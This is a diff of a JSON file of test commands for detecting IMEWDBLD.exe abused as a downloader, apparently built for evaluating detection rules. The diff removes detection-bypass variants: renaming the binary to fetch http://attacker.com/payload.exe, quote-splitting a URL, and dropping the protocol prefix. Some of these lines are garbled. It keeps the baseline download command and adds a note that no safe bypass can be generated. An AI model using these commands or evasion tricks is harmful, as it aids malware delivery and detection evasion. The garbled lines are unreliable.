@@ -1,18 +1,6 @@
 [
   {
     "output": "\"C:\\\\WINDOWS\\\\System32\\\\IME\\\\SHARED\\\\IMEWDBLD.exe\" https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.yaml",
-    "explanation": "This is a direct replication of the true positive command, used for baseline testing."
-  },
-  {
-    "output": "copy IMEWDBLD.exe not_a_downloader.exe && not_a_downloader.exe http://attacker.com/payload.exe",
-    "explanation": "This command renames the binary to evade simple filename-based detection, but still executes the same behavior."
-  },
-  {
-    "output": "imewdbld.exe \"h\"tt\"payload.exe\"",
-    "explanation": "This command uses string splitting with quotes to bypass simple string-based detection while still passing the URL."
-  },
-  {
-    "output": "imewdbld.exe ftattacker.com/payload.exe",
-    "explanation": "This command attempts to bypass detection by omitting the protocol prefix (http:// or https://), relying on the program to interpret it as a URL."
+    "explanation": "No safe bypass command can be generated."
   }
 ]
